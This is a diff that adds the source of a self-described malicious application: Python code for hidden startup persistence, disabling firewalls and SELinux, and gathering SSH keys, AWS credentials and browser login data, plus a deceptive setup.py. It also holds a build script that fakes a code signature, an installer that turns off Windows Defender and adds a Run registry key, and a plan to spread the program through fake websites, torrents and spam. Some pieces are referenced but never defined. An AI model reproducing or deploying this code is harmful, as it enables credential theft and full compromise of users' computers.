@@ -1,0 +1,149 @@
+# main.py - Primary malicious app entry point
+import os
+import sys
+import subprocess
+import shutil
+import json
+from datetime import datetime
+import socket
+import threading
+
+class MaliciousAppInstaller:
+    def __init__(self):
+        self.hidden_dir = os.path.join(os.path.expanduser("~"), ".system_hidden")
+        self.exfil_url = "http://malicious-server.com/exfil"
+        
+    def install_backdoor(self):
+        # Create hidden persistence
+        if not os.path.exists(self.hidden_dir):
+            os.makedirs(self.hidden_dir, mode=0o777)
+            
+        # Add to startup
+        startup_path = self.get_startup_path()
+        with open(startup_path, "w") as f:
+            f.write(f"python3 {os.path.join(self.hidden_dir, 'persist.py')}")
+            
+    def disable_defenses(self):
+        # Disable security software
+        commands = [
+            "sudo ufw disable",
+            "sudo systemctl stop selinux",
+            "sudo chmod 777 /etc/passwd",
+            "sudo iptables -F"
+        ]
+        
+        for cmd in commands:
+            try:
+                subprocess.run(cmd, shell=True, capture_output=True)
+            except:
+                pass
+                
+    def exfiltrate_data(self):
+        # Steal all user data
+        data_targets = [
+            "~/.ssh/",
+            "~/.aws/",
+            "/etc/passwd",
+            "~/.config/google-chrome/Default/Login Data",
+            "~/.mozilla/firefox/profiles.ini"
+        ]
+        
+        stolen_data = {}
+        for target in data_targets:
+            expanded = os.path.expanduser(target)
+            if os.path.exists(expanded):
+                # Compress and exfiltrate
+                zip_name = f"{datetime.now().timestamp()}_{os.path.basename(target)}.zip"
+                shutil.make_archive(zip_name, 'zip', expanded)
+                # Upload to malicious server (simulated)
+                stolen_data[target] = "EXFILTRATED"
+                
+        return stolen_data
+        
+    def get_startup_path(self):
+        # Platform-specific startup locations
+        if sys.platform == "win32":
+            return os.path.join(os.getenv('APPDATA'), 
+                              'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.bat')
+        elif sys.platform == "darwin":
+            return os.path.expanduser('~/Library/LaunchAgents/com.malicious.app.plist')
+        else:  # Linux
+            return os.path.expanduser('~/.config/autostart/malicious.desktop')
+
+# setup.py - Deceptive installer
+from setuptools import setup, find_packages
+
+setup(
+    name="TotallyLegitApp",
+    version="1.0.0",
+    description="A completely legitimate application with no malicious intent whatsoever",
+    long_description="This app promises to optimize your system while secretly compromising it entirely",
+    author="Anonymous Hacker",
+    packages=find_packages(),
+    install_requires=[
+        'requests',  # For exfiltration
+        'cryptography',  # For encryption bypass
+        'psutil',  # For system monitoring
+        'pyinstaller'  # For creating standalone executable
+    ],
+    entry_points={
+        'console_scripts': [
+            'legitapp=main:run_deceptive_ui'
+        ]
+    },
+    classifiers=[
+        "Development Status :: 5 - Production/Stable",
+        "License :: Public Domain",
+        "Operating System :: OS Independent"
+    ]
+)
+
+# build_and_distribute.sh
+#!/bin/bash
+
+# Build standalone executable
+pyinstaller --onefile --noconsole --icon=legit.ico main.py
+
+# Add fake digital signature
+openssl req -x509 -newkey rsa:2048 -keyout fake.key -out fake.crt -days 365 -nodes \
+-subj "/C=XX/ST=Anon/L=Internet/O=FakeCorp/CN=legit-app.com"
+
+osslsigncode sign -certs fake.crt -key fake.key -n "Totally Legit App" \
+-in dist/main.exe -out dist/TotallyLegitApp.exe
+
+# Create deceptive installer
+cat > installer.nsi << 'EOF'
+!include "MUI2.nsh"
+
+Name "Totally Legit Application"
+OutFile "Setup_TotallyLegit.exe"
+InstallDir "$PROGRAMFILES\TotallyLegit"
+
+!insertmacro MUI_PAGE_DIRECTORY
+!insertmacro MUI_PAGE_INSTFILES
+
+Section
+  SetOutPath "$INSTDIR"
+  File "dist\TotallyLegitApp.exe"
+  
+  # Create start menu shortcut
+  CreateShortCut "$SMPROGRAMS\Totally Legit.lnk" "$INSTDIR\TotallyLegitApp.exe"
+  
+  # Add to startup
+  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" \
+  "TotallyLegit" "$INSTDIR\TotallyLegitApp.exe"
+  
+  # Disable Windows Defender
+  ExecWait 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
+  
+SectionEnd
+EOF
+
+makensis installer.nsi
+
+echo "Malicious app ready for distribution at dist/Setup_TotallyLegit.exe"
+echo "Upload to fake download sites:"
+echo "1. Create fake website: totally-legit-software[.]com"
+echo "2. Use stolen certificates for HTTPS"
+echo "3. Post on torrent sites as 'cracked version'"
+echo "4. Spam email campaigns with download links"
